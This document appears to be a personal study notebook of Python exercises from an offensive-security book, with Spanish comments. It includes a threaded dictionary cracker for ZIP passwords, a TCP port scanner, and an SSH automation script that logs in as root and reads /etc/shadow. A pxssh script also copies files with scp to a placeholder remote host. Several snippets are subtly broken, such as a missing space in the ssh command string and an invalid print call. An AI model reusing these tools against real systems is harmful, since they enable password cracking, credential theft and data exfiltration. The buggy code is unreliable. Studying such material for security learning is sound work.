import zipfile
zFile = zipfile.ZipFile('jamones.zip')
zFile.extractall(pwd='secret')


Este script generaba un error al usar el interprete de python 3.x:

TypeError: pwd: expected bytes, got <class 'str'>

Solucion: --> pwd should be bytes objects  'Agregamos b para definir el tipo' o .encode('ascii') (ver 2)

import zipfile
zFile = zipfile.ZipFile('jamones.zip')
zFile.extractall(pwd=b'secret')
_________________________________________________________2__________________________________________________________________

import zipfile
import os
zFile = zipfile.ZipFile('jamones.zip')
passFile=open('dictionary.txt')
for line in passFile.readlines():
    password = line.strip('\n')
    try:
        zFile.extractall(pwd=password.encode('ascii'))
        print ('Password ='+password+'\n')
        exit(0)
    except Exception as e:
        pass
        
_________________________________________________________3__________________________________________________________________

import zipfile
import threading
import optparse

def extractFile(zFile, password):
    try:
        zFile.extractall(pwd=password.encode('ascii'))
        print('Pass is:\n'+password+'\n')
    except Exception as e:
        print(e)
def main():
    parser=optparse.OptionParser('Muerto! usa los Flags:\n '+\
    '-f <zipfile> -d <dictionary>')
    parser.add_option('-f', dest='zname', type='string', \
    help='specify zip file')
    parser.add_option('-d', dest='dname', type='string', \
    help='specify dictionary')
    (options,args)=parser.parse_args()
    if (options.zname==None) | (options.dname==None):
        print (parser.usage)
        exit(0)
    else:
        zname=options.zname
        dname=options.dname
    zFile=zipfile.ZipFile(zname)
    passFile=open(dname)
    for line in passFile.readlines():
        password=line.strip('\n')
        t=threading.Thread(target=extractFile, args=(zFile,password))
        t.start()
if __name__=='__main__':
    main()






    #zFile=zipfile.ZipFile('jamones.zip')
    #passFile=open('dictionary.txt')
    #for line in passFile.readlines():
    #    password=line.strip('\n')
    #    t=threading.Thread(target=extractFile, args=(zFile, password))
    #    t.start()
if __name__=='__main__':
    main()


_____________________________________________________________________________________________________________________________


import optparse
import socket
from socket import *

#parser = optparse.OptionParser('Flags -H '+\
#    '<target host> -p <target port>')
#parser.add_option('-H', dest='tgtHost', type='string',\
#    help='specify target host')
#parser.add_option('-p', dest ='tgtPort', type='int',\
#    help='specify port')
#(options, args)= parser.parse_args()
#tgtHost = options.tgtHost
#tgtPort = options.tgtPort
#if (tgtHost == None) | (tgtPort == None):
#    print parser.usage
#    exit(0)
def connScan(tgtHost, tgtPort):
    try:
        connSkt = socket(AF_INET, SOCK_STREAM)
        connSkt.connect((tgtHost, tgtPort))
        connSkt.send('VP\r\n')
        results = connSkt.recv(1024)
        print ('%d/tcp open'% tgtPort)
        print (+str(results))
        connSkt.close()
    except:
        print ('%d/tcp closed'% tgtPort)
def portScan (tgtHost, tgtPort):
    try:
        tgtIp=gethostbyname(tgtHost)
    except:
        print('Cannot Resolve: ''%s'': Unknow Host' +tgtHost)
        return
    try:
        tgtName = gethostbyaddr(tgtIp)
        print ('\n Scan Results: ' +tgtName[0])
    except:
        print ('\n Scan Results: ' +tgtIp)
    setdefaulttimeout(1)
    for tgtPort in tgtPort:
        print('Scanning Port: ' +tgtPort)
        connScan(tgtHost, int(tgtPort))
def main():

 parser = optparse.OptionParser('Flags -H '+\
    '<target host> -p <target port>')
 parser.add_option('-H', dest='tgtHost', type='string',\
    help='specify target host')
 parser.add_option('-p', dest ='tgtPort', type='string',\
    help='specify port[s] separated by comma')
 (options, args)= parser.parse_args()
 tgtHost = options.tgtHost
 tgtPort = str(options.tgtPort).split(',')
 if (tgtHost == None) | (tgtPort[0] == None):
    print ('Especifica Host y Puerto')
    exit(0)
 portScan(tgtHost, tgtPort)
if __name__=='__main__':
    main()


______________________________________________________SSH - CHAPTER II_____________________________________________________________


import pexpect

PROMPT = ['#','>>>','>','\$']

def send_command(child, cmd):
    child.sendline(cmd)
    child.expect(PROMPT)
    print(child.before)

def connect(user, host, password):
    ssh_newkey = 'Are you sure you want to continue connecting'
    connStr='ssh'+user+'@'+host
    child = pexpect.spawn(connStr)
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword:'])
    if ret == 0:
        print('Error')
        return
    if ret == 1:
        child.sendline('yes')
        ret = child.expect([pexpect.TIMEOUT, '[P|p]assword:'])
    if ret == 0:
        print('Error conn')
        return
    child.sendline(password)
    child.expect(PROMPT)
    return child

def main():
    host = '192.9.200.11'
    user = 'root'
    password = 'toor'
    child = connect(user, host, password)
    send_command(child, 'cat /etc/shadow | grep root')
if __name__=='__main__':
    main()
_________________________________________________________________________________________________________________________

from pexpect import pxssh
import getpass

#Desde VP Book

"""def send_commandline(s, cmd):
    s.sendline(cmd)
    s.prompt()
    print s.before
def connect(host,user,password):
    s=  pxssh.pxssh()
    s.login(host,user,password)
    return s
s = connect('127.0.0.1', 'root', 'xxx')
send_command(s, 'scp ....bla.bla.bla')"""


#Desde Pexpect WeB

try:

    s = pxssh.pxssh()
    hostname = raw_input('hostname: ')
    username = raw_input('username: ')
    password = getpass.getpass('password: ')
    s.login (hostname, username, password)
    s.sendline ('uptime')
    s.prompt()
    print(s.before)
    s.sendline('scp -r /xxx xxx@x.x.x.x:/xxx/algun_archivo')
    s.prompt()
    print(s.before)
    s.sendline('df')
    s.prompt()
    print(s.before)
    s.logout()
except Exception as e:
    print(e)
____________________________________________________________________________________________________________________________


